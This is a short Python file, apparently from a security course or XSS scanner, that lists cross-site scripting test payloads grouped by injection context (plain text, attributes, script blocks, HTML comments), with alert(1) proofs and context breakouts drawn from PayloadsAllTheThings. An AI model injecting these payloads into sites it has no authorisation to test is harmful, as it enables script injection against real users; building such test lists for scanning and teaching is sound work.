# Payloads base agrupados por contexto
# Basados en parte en los ejemplos de clase y PayloadsAllTheThings
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
payloads = {
    "PLAIN_TEXT": [
        "<script>alert(1)</script>",           
        "<img src='x' onerror=alert(1)>",      
        "<svg onload=alert(1)>",               
        "<img/src='1'/onerror=alert(1)>"       
    ],
    "ATTRIBUTE": [
        "\"><script>alert(1)</script>",
        "\" autofocus onfocus=alert(1) x=\"",
        "'><script>alert(1)</script>",
    ],
    "SCRIPT": [
        "';alert(1);//",
        "\";alert(1);//",
        "';throw onerror=alert,1;//",
        "</script><script>alert(1)</script>"
    ],
    "COMENTARIO": [
        "--><script>alert(1)</script>"
    ],
    "OTHER": [
        "<script>alert(1)</script>"
    ]
}
